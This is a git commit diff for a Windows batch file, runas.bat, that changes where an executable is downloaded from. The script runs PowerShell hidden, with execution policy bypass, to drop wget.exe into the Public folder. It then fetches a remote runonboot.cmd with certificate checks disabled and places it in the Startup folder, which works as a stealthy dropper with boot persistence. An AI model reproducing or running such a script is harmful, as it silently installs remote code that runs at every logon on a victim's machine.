c5ece068e217341ea68b555b8121ed25ced05e04
mediatui <57651467+mediatui@users.noreply.github.com>
2019-12-02 14:10:23 +1300

    Update runas.bat

--- multi/runas.bat
+++ multi/runas.bat
@@ -1,4 +1,4 @@
-cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://web.archive.org/web/20190817130225/https://eternallybored.org/misc/wget/1.20.3/32/wget.exe',\"$env:PUBLIC\wget.exe\")
+cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://github.com/mediatui/tool/raw/master/wget.exe',\"$env:PUBLIC\wget.exe\")
 setx wget "C:\Users\Public\wget.exe"
 setx startup "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 C:\Users\Public\wget.exe -q https://raw.githubusercontent.com/mediatui/tool/master/multi/runonboot.cmd --no-check-certificate -O "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runonboot.cmd"
